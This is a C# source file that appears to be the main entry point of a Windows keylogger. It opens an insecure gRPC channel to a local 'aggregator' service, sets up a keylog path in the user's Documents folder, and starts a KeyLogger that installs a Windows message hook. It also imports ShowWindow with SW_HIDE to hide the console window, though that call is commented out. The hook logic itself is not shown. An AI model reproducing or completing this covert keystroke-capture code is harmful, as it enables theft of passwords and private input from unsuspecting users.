using Grpc.Core;
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Hooks
{

    class Logger
    {
        ///<summary>
        ///This starts the keylogger.
        ///</summary>
        static void Main(string[] args)
        {
            // Create connection to aggergator process
            string addr = "localhost";
            int port = 4567;
            var channel = new Channel(addr, port, Credentials.Insecure);
            var client = HookKeylogger.Base.KerPressAggergator.NewClient(channel);
            //var handle = GetConsoleWindow();
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) +"\\keylog";

            // Initialize keylogger and install windows message hook.
            var kl = new KeyLogger(client);

            // Hide
            //ShowWindow(handle, SW_HIDE);

            Application.Run();
            kl.Deactivate();
            //while (true) { System.Threading.Thread.Sleep(1000000); }
            
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
